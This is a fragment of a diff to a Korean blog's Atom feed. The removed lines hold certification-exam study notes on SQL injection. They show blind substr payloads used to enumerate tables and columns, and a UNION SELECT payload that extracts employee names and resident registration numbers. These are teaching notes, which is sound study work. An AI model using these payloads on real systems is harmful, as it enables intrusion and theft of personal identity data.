-                  &lt;li&gt;information_schema.tables, information_schema.columns, union select 이용&lt;/li&gt;
-                &lt;/ul&gt;
-              &lt;/li&gt;
-              &lt;li&gt;테이블명 획득
-                &lt;ul&gt;
-                  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&apos; and substr((select table_name ...),1,1)=&apos;a&apos;#&lt;/code&gt;&lt;/li&gt;
-                  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%27+and+substr%28%28select+table_name...&lt;/code&gt;
-                    &lt;ul&gt;
-                      &lt;li&gt;POST 의 Message Body 영역에 URIEncoding 방식으로 변경되어 전송됨&lt;/li&gt;
-                    &lt;/ul&gt;
-                  &lt;/li&gt;
-                &lt;/ul&gt;
-              &lt;/li&gt;
-              &lt;li&gt;컬럼정보 획득 (획득한 테이블 정보 employee)
-                &lt;ul&gt;
-                  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&apos; and substr((select column_name from information_schema.columns where tablew_name=&apos;employee&apos; limit 0,1),1,1)=&apos;a&apos;#&lt;/code&gt;&lt;/li&gt;
-                &lt;/ul&gt;
-              &lt;/li&gt;
-              &lt;li&gt;Data 획득 (획득한 컬럼정보 이용)
-                &lt;ul&gt;
-                  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&apos; and 1=2 union select &apos;a&apos;,&apos;b&apos;,&apos;c&apos;,&apos;d&apos;,&apos;e&apos;,&apos;f&apos;,&apos;g&apos;,&apos;h&apos;,&apos;i&apos;#&lt;/code&gt;
-                    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  select * from bbs where subject like &apos;%&apos; and 1=2 union select &apos;a&apos;, &apos;b&apos;, &apos;c&apos;, &apos;d&apos;, &apos;e&apos;, &apos;f&apos;, &apos;g&apos;, &apos;h&apos;, &apos;i&apos;#%&apos;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;                    &lt;/div&gt;
-                    &lt;ul&gt;
-                      &lt;li&gt;1=2 를 통해 원 검색결과 출력을 막음&lt;/li&gt;
-                      &lt;li&gt;필드개수 9개 : bbs의 필드개수와 동일하게 설정&lt;/li&gt;
-                      &lt;li&gt;출력 결과를 통해 웹사이트의 필드가 어떤 컬럼과 매핑되는지 확인&lt;/li&gt;
-                    &lt;/ul&gt;
-                  &lt;/li&gt;
-                  &lt;li&gt;출력위치 확인 후 해당 위치로 employee 테이블의 조회결과 출력&lt;/li&gt;
-                  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&apos; and 1=2 union select null,null,null,concat(name, &apos;/&apos;, juminNo), null, null, null, null, null from employee#&lt;/code&gt;
-                    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  select * from bbs where subject like &apos;%&apos; and 1=2 union select null, null, null, concat(name, &apos;/&apos;, juminNo), null, null, null, null, null from employee#%&apos;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;                    &lt;/div&gt;
-                  &lt;/li&gt;
-                &lt;/ul&gt;
-              &lt;/li&gt;
-            &lt;/ul&gt;
-          &lt;/li&gt;
-        &lt;/ul&gt;
-      &lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;</content><author><name>HY03</name><email>hyunik03@gmail.com</email></author><category term="IS_Certification" /><category term="정보보안기사" /><category term="어플리케이션" /><summary type="html">SQL Injection</summary></entry></feed>
+&lt;/ul&gt;</content><author><name>HY03</name><email>hyunik03@gmail.com</email></author><category term="IS_Certification" /><category term="정보보안기사" /><category term="어플리케이션" /><summary type="html">XSS(Cross Site Script)</summary></entry></feed>
